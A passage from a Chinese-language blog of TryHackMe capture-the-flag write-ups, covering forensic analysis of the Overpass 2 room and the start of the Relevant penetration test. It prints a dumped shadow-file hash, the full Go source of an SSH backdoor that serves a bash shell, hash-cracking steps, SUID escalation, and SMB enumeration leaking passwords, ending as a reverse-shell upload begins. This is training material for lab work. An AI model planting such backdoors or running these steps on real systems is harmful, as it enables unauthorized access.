muirland:$<span class="hljs-number">6</span><span class="hljs-variable">$SWybS8o2</span>$<span class="hljs-number">9</span>diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.<span class="hljs-number">2</span>MrOj2o1Sw/fd2cu0kC6dUP.:<span class="hljs-number">18464</span>:<span class="hljs-number">0</span>:<span class="hljs-number">99999</span>:<span class="hljs-number">7</span>:::</code></pre>
<p>上面是攻击者获取的相关密码信息（转储影子文件所得），这里我们john爆破一下，发现有四个可以爆破出来</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839742.png" alt="image-20240426105717797"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839743.png" alt="image-20240426105634948"></p>
<h2 id="研究-分析代码">研究-分析代码</h2>
<p>现在您已经找到了后门的代码，是时候分析它了。</p>
<p>github搜索即可，如下图可以看到默认密码和硬编码盐</p>
<pre><code class="hljs go"><span class="hljs-keyword">package</span> main

<span class="hljs-keyword">import</span> (
	<span class="hljs-string">"crypto/sha512"</span>
	<span class="hljs-string">"fmt"</span>
	<span class="hljs-string">"io"</span>
	<span class="hljs-string">"io/ioutil"</span>
	<span class="hljs-string">"log"</span>
	<span class="hljs-string">"net"</span>
	<span class="hljs-string">"os/exec"</span>

	<span class="hljs-string">"github.com/creack/pty"</span>
	<span class="hljs-string">"github.com/gliderlabs/ssh"</span>
	<span class="hljs-string">"github.com/integrii/flaggy"</span>
	gossh <span class="hljs-string">"golang.org/x/crypto/ssh"</span>
	<span class="hljs-string">"golang.org/x/crypto/ssh/terminal"</span>
)

<span class="hljs-keyword">var</span> hash <span class="hljs-type">string</span> = <span class="hljs-string">"bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3"</span>

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {
	<span class="hljs-keyword">var</span> (
		lport       <span class="hljs-type">uint</span>   = <span class="hljs-number">2222</span>
		lhost       net.IP = net.ParseIP(<span class="hljs-string">"0.0.0.0"</span>)
		keyPath     <span class="hljs-type">string</span> = <span class="hljs-string">"id_rsa"</span>
		fingerprint <span class="hljs-type">string</span> = <span class="hljs-string">"OpenSSH_8.2p1 Debian-4"</span>
	)

	flaggy.UInt(&amp;lport, <span class="hljs-string">"p"</span>, <span class="hljs-string">"port"</span>, <span class="hljs-string">"Local port to listen for SSH on"</span>)
	flaggy.IP(&amp;lhost, <span class="hljs-string">"i"</span>, <span class="hljs-string">"interface"</span>, <span class="hljs-string">"IP address for the interface to listen on"</span>)
	flaggy.String(&amp;keyPath, <span class="hljs-string">"k"</span>, <span class="hljs-string">"key"</span>, <span class="hljs-string">"Path to private key for SSH server"</span>)
	flaggy.String(&amp;fingerprint, <span class="hljs-string">"f"</span>, <span class="hljs-string">"fingerprint"</span>, <span class="hljs-string">"SSH Fingerprint, excluding the SSH-2.0- prefix"</span>)
	flaggy.String(&amp;hash, <span class="hljs-string">"a"</span>, <span class="hljs-string">"hash"</span>, <span class="hljs-string">"Hash for backdoor"</span>)
	flaggy.Parse()

	log.SetPrefix(<span class="hljs-string">"SSH - "</span>)
	privKeyBytes, err := ioutil.ReadFile(keyPath)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		log.Panicln(<span class="hljs-string">"Error reading privkey:\t"</span>, err.Error())
	}
	privateKey, err := gossh.ParsePrivateKey(privKeyBytes)
	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
		log.Panicln(<span class="hljs-string">"Error parsing privkey:\t"</span>, err.Error())
	}
	server := &amp;ssh.Server{
		Addr:            fmt.Sprintf(<span class="hljs-string">"%s:%v"</span>, lhost.String(), lport),
		Handler:         sshterminal,
		Version:         fingerprint,
		PasswordHandler: passwordHandler,
	}
	server.AddHostKey(privateKey)
	log.Println(<span class="hljs-string">"Started SSH backdoor on"</span>, server.Addr)
	log.Fatal(server.ListenAndServe())
}
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">verifyPass</span><span class="hljs-params">(hash, salt, password <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> {
	resultHash := hashPassword(password, salt)
	<span class="hljs-keyword">return</span> resultHash == hash
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">hashPassword</span><span class="hljs-params">(password <span class="hljs-type">string</span>, salt <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">string</span> {
	hash := sha512.Sum512([]<span class="hljs-type">byte</span>(password + salt))
	<span class="hljs-keyword">return</span> fmt.Sprintf(<span class="hljs-string">"%x"</span>, hash)
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sshHandler</span><span class="hljs-params">(s ssh.Session)</span></span> {
	command := s.RawCommand()
	<span class="hljs-keyword">if</span> command != <span class="hljs-string">""</span> {
		s.Write(runCommand(command))
		<span class="hljs-keyword">return</span>
	}
	term := terminal.NewTerminal(s, <span class="hljs-string">"$ "</span>)
	<span class="hljs-keyword">for</span> {
		command, _ = term.ReadLine()
		<span class="hljs-keyword">if</span> command == <span class="hljs-string">"exit"</span> {
			<span class="hljs-keyword">return</span>
		}
		term.Write(runCommand(command))
	}
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">sshterminal</span><span class="hljs-params">(s ssh.Session)</span></span> {
	cmd := exec.Command(<span class="hljs-string">"/bin/bash"</span>, <span class="hljs-string">"-i"</span>)
	ptyReq, _, isPty := s.Pty()
	<span class="hljs-keyword">if</span> isPty {
		cmd.Env = <span class="hljs-built_in">append</span>(cmd.Env, fmt.Sprintf(<span class="hljs-string">"TERM=%s"</span>, ptyReq.Term))
		f, err := pty.Start(cmd)
		<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {
			<span class="hljs-built_in">panic</span>(err)
		}
		<span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {
			io.Copy(f, s) <span class="hljs-comment">// stdin</span>
		}()
		io.Copy(s, f) <span class="hljs-comment">// stdout</span>
		cmd.Wait()
	} <span class="hljs-keyword">else</span> {
		io.WriteString(s, <span class="hljs-string">"No PTY requested.\n"</span>)
		s.Exit(<span class="hljs-number">1</span>)
	}
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">runCommand</span><span class="hljs-params">(cmd <span class="hljs-type">string</span>)</span></span> []<span class="hljs-type">byte</span> {
	result := exec.Command(<span class="hljs-string">"/bin/bash"</span>, <span class="hljs-string">"-c"</span>, cmd)
	response, _ := result.CombinedOutput()
	<span class="hljs-keyword">return</span> response
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">passwordHandler</span><span class="hljs-params">(_ ssh.Context, password <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">bool</span> {
	<span class="hljs-keyword">return</span> verifyPass(hash, <span class="hljs-string">"1c362db832f3f864c8c2fe05f2002a05"</span>, password)
}</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839744.png" alt="image-20240426111120510"></p>
<p>上图是攻击者使用的hash</p>
<pre><code class="hljs scss"><span class="hljs-number">6</span>d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839745.png" alt="image-20240426111422460"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839746.png" alt="image-20240426111701501"></p>
<p>如上图，识别出该hash加密的可能算法，这里尝试sha512，对应的到 <a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat</a>看一下对应的编号</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839747.png" alt="image-20240426111527572"></p>
<p>显然根据上述go后门文件，这里是1710的格式</p>
<pre><code class="hljs scss"><span class="hljs-number">6</span>d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:<span class="hljs-number">1</span>c362db832f3f864c8c2fe05f2002a05</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839748.png" alt="image-20240426112123090"></p>
<p>可以看到这里成功破解出盐：november16</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839749.png" alt="image-20240426112331301"></p>
<h2 id="攻击-重新进入">攻击-重新进入</h2>
<p>现在事件已经调查完毕，Paradox 需要有人再次控制 Overpass 生产服务器。包装盒上有标志，Overpass不能因为格式化服务器而失去！</p>
<pre><code class="hljs scss">ssh -oHostKeyAlgorithms=+ssh-rsa james@<span class="hljs-number">10.10</span>.<span class="hljs-number">115.228</span> -p <span class="hljs-number">2222</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839750.png" alt="image-20240426114522880"></p>
<p>接下来就是提权，sudo -l没有结果，尝试suid，如下图，发现.suid_bash可疑文件</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839751.png" alt="image-20240426115357551"></p>
<p>file命令查看，如下图：为一个64位的ELF可执行文件。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839752.png" alt="image-20240426115450524"></p>
<p>我们尝试执行，这里需要注意虽然该文件设置了suid权限，但需要你添加-p选项才可以以root身份运行，原因如下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839753.png" alt="image-20240426120831446"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839754.png" alt="image-20240426115913599"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839755.png" alt="image-20240426115939874"></p>
<h2 id="总结">总结</h2>
<p>这篇文章，让我们学习的取证分析，得到流量包，在追踪TCP和HTTP流的过程，我们得知了攻击者是如何攻击该站点，并注入了后门。之后我们重新攻击的时候，直接利用该后门，ssh登录上去，身份为James，之后依旧是提权，sudo -l无果，尝试suid提权，找到一个二进制文件存在suid权限，执行的时候添加-p得到root身份。</p>
<h2 id="参考文章">参考文章</h2>
<p>Writeup for TryHackMe Room ‘<a target="_blank" rel="noopener" href="https://tryhackme.com/room/overpass2hacked">Overpass 2 - Hacked</a>’</p>
<p><a target="_blank" rel="noopener" href="https://github.com/kurohat/writeUp/blob/master/TryHackMe/Easy/Overpass-2.md">Forensics - Analyse the PCAP</a></p>
<h1 id="0x11-relevant">0x11 Relevant</h1>
<h2 id="渗透测试要求">渗透测试要求</h2>
<p>您已被分配到一个客户端，该客户端希望在 7 天内发布到生产环境中的环境上执行渗透测试。</p>
<p><strong>Scope of Work 工作范围</strong></p>
<p>客户要求工程师对提供的虚拟环境进行评估。客户要求提供有关评估的最少信息，希望从恶意行为者的角度进行参与（黑匣子渗透测试）。 客户端要求您保护两个标志（未提供位置）作为利用证明：</p>
<ul>
<li>User.txt</li>
<li>Root.txt</li>
</ul>
<p>此外，客户还提供了以下范围津贴：</p>
<ul>
<li>此服务允许使用任何工具或技术，但我们要求您先尝试手动利用</li>
<li>查找并记录发现的所有漏洞</li>
<li>将发现的标志提交到仪表板</li>
<li>只有分配给计算机的 IP 地址在范围内</li>
<li>查找并报告所有漏洞（是的，有多个根路径）</li>
</ul>
<p>（角色扮演关闭）</p>
<p>我鼓励您将此挑战视为实际的渗透测试。考虑编写一份报告，包括执行摘要、漏洞和漏洞利用评估以及补救建议，因为这将有利于您准备 eLearnSecurity 认证专业渗透测试人员或该领域渗透测试人员的职业生涯。</p>
<p>注意 - 这个房间里没有任何东西需要Metasploit</p>
<p>计算机最多可能需要 5 分钟才能启动所有服务。</p>
<p>*<strong>此房间不接受书面记录。</strong></p>
<h2 id="常规扫描">常规扫描</h2>
<pre><code class="hljs scss">nmap -T5 -<span class="hljs-selector-tag">p</span>- <span class="hljs-number">10.10</span><span class="hljs-selector-class">.127</span><span class="hljs-selector-class">.72</span></code></pre>
<pre><code class="hljs scss">Starting Nmap <span class="hljs-number">7.94S</span>VN ( https://nmap.org ) at <span class="hljs-number">2024</span>-<span class="hljs-number">04</span>-<span class="hljs-number">29</span> <span class="hljs-number">10</span>:<span class="hljs-number">59</span> CST
Stats: <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">05</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About <span class="hljs-number">0.52%</span> done
Stats: <span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">07</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About <span class="hljs-number">0.97%</span> done
Stats: <span class="hljs-number">0</span>:<span class="hljs-number">02</span>:<span class="hljs-number">51</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About <span class="hljs-number">46.66%</span> done; ETC: <span class="hljs-number">11</span>:<span class="hljs-number">05</span> (<span class="hljs-number">0</span>:<span class="hljs-number">03</span>:<span class="hljs-number">15</span> remaining)
Stats: <span class="hljs-number">0</span>:<span class="hljs-number">04</span>:<span class="hljs-number">29</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About <span class="hljs-number">81.33%</span> done; ETC: <span class="hljs-number">11</span>:<span class="hljs-number">05</span> (<span class="hljs-number">0</span>:<span class="hljs-number">01</span>:<span class="hljs-number">02</span> remaining)
Nmap scan report for <span class="hljs-number">10.10</span>.<span class="hljs-number">127.72</span>
Host is up (<span class="hljs-number">0.20s</span> latency).
Not shown: <span class="hljs-number">65527</span> filtered tcp ports (no-response)
PORT      STATE SERVICE
<span class="hljs-number">80</span>/tcp    open  http
<span class="hljs-number">135</span>/tcp   open  msrpc
<span class="hljs-number">139</span>/tcp   open  netbios-ssn
<span class="hljs-number">445</span>/tcp   open  microsoft-ds
<span class="hljs-number">3389</span>/tcp  open  ms-wbt-server
<span class="hljs-number">49663</span>/tcp open  unknown
<span class="hljs-number">49667</span>/tcp open  unknown
<span class="hljs-number">49669</span>/tcp open  unknown

Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">324.81</span> seconds</code></pre>
<p>可以看到139与445端口开启，尝试枚举SMB</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839756.png" alt="image-20240429111707274"></p>
<p>接着连接目标nt4wrksv共享SMB服务</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839757.png" alt="image-20240429113313488"></p>
<p>幸运的无密码即可访问，看到当前目录含有密码文件，下载查看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839758.png" alt="image-20240429113346541"></p>
<pre><code class="hljs scss">Bob - !<span class="hljs-selector-tag">P</span>@$<span class="hljs-variable">$W0rD</span>!<span class="hljs-number">123</span>
Bill - Juw4nnaM4n420696969!$$$</code></pre>
<p>接着对这些存活端口进行详细扫描</p>
<pre><code class="hljs scss">nmap -<span class="hljs-selector-tag">p</span> <span class="hljs-number">80</span>,<span class="hljs-number">135</span>,<span class="hljs-number">139</span>,<span class="hljs-number">445</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">49663</span>,<span class="hljs-number">49667</span>,<span class="hljs-number">49669</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.127</span><span class="hljs-selector-class">.72</span> -sC -sV 
Starting Nmap <span class="hljs-number">7.94S</span>VN ( https://nmap.org ) at <span class="hljs-number">2024</span>-<span class="hljs-number">04</span>-<span class="hljs-number">29</span> <span class="hljs-number">11</span>:<span class="hljs-number">38</span> CST
Stats: <span class="hljs-number">0</span>:<span class="hljs-number">01</span>:<span class="hljs-number">09</span> elapsed; <span class="hljs-number">0</span> hosts completed (<span class="hljs-number">1</span> up), <span class="hljs-number">1</span> undergoing Script Scan
NSE Timing: About <span class="hljs-number">98.38%</span> done; ETC: <span class="hljs-number">11</span>:<span class="hljs-number">39</span> (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> remaining)
Nmap scan report for <span class="hljs-number">10.10</span>.<span class="hljs-number">127.72</span>
Host is up (<span class="hljs-number">0.20s</span> latency).

PORT      STATE SERVICE       VERSION
<span class="hljs-number">80</span>/tcp    open  http          Microsoft IIS httpd <span class="hljs-number">10.0</span>
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/<span class="hljs-number">10.0</span>
<span class="hljs-number">135</span>/tcp   open  msrpc         Microsoft Windows RPC
<span class="hljs-number">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
<span class="hljs-number">445</span>/tcp   open  microsoft-ds  Windows Server <span class="hljs-number">2016</span> Standard Evaluation <span class="hljs-number">14393</span> microsoft-ds
<span class="hljs-number">3389</span>/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: <span class="hljs-number">2024</span>-<span class="hljs-number">04</span>-<span class="hljs-number">29</span>T03:<span class="hljs-number">39</span>:<span class="hljs-number">53</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; -<span class="hljs-number">1s</span> from scanner <span class="hljs-selector-tag">time</span>.
| ssl-cert: Subject: commonName=Relevant
| Not valid before: <span class="hljs-number">2024</span>-<span class="hljs-number">04</span>-<span class="hljs-number">28</span>T02:<span class="hljs-number">58</span>:<span class="hljs-number">49</span>
|_Not valid after:  <span class="hljs-number">2024</span>-<span class="hljs-number">10</span>-<span class="hljs-number">28</span>T02:<span class="hljs-number">58</span>:<span class="hljs-number">49</span>
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: <span class="hljs-number">10.0</span>.<span class="hljs-number">14393</span>
|_  System_Time: <span class="hljs-number">2024</span>-<span class="hljs-number">04</span>-<span class="hljs-number">29</span>T03:<span class="hljs-number">39</span>:<span class="hljs-number">14</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>
<span class="hljs-number">49663</span>/tcp open  http          Microsoft IIS httpd <span class="hljs-number">10.0</span>
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/<span class="hljs-number">10.0</span>
<span class="hljs-number">49667</span>/tcp open  msrpc         Microsoft Windows RPC
<span class="hljs-number">49669</span>/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server <span class="hljs-number">2008</span> R2 - <span class="hljs-number">2012</span>; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>: 
|_    Message signing enabled but not required
|_clock-skew: mean: <span class="hljs-number">1</span>h24m00s, deviation: <span class="hljs-number">3</span>h07m52s, median: <span class="hljs-number">0s</span>
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: <span class="hljs-number">2024</span>-<span class="hljs-number">04</span>-<span class="hljs-number">29</span>T03:<span class="hljs-number">39</span>:<span class="hljs-number">14</span>
|_  start_date: <span class="hljs-number">2024</span>-<span class="hljs-number">04</span>-<span class="hljs-number">29</span>T02:<span class="hljs-number">59</span>:<span class="hljs-number">08</span>
| smb-os-discovery: 
|   OS: Windows Server <span class="hljs-number">2016</span> Standard Evaluation <span class="hljs-number">14393</span> (Windows Server <span class="hljs-number">2016</span> Standard Evaluation <span class="hljs-number">6.3</span>)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: <span class="hljs-number">2024</span>-<span class="hljs-number">04</span>-<span class="hljs-number">28</span>T20:<span class="hljs-number">39</span>:<span class="hljs-number">18</span>-<span class="hljs-number">07</span>:<span class="hljs-number">00</span>

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">101.66</span> seconds</code></pre>
<h2 id="web站点探测">Web站点探测</h2>
<p>尝试扫web站点目录，在49663端口下扫到了隐藏目录</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839759.png" alt="image-20240429193020118"></p>
<p>感觉又是我想不到的思路，这里可以看到隐藏目录与我们SMB共享目录名称相同，我们访问看看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202406031839760.png" alt="image-20240429193752399"></p>
<p>可以看到直接访问就能得到文件内容，说明这个用户的SMB共享托管到了web站点了，这里我看有的师傅是先尝试nmap继续扫描看是否存在一些脆弱的易受攻击的服务，也有的直接就知道可以上传反向shell。</p>
<h2 id="smb上传反向shell">SMB上传反向shell</h2>
<p>这里我也先跟着师傅们走，等最后回过头来在思考，首先msf生成一个反向shell，由于这是IIS服务器，因此肯定是生成aspx文件</p>
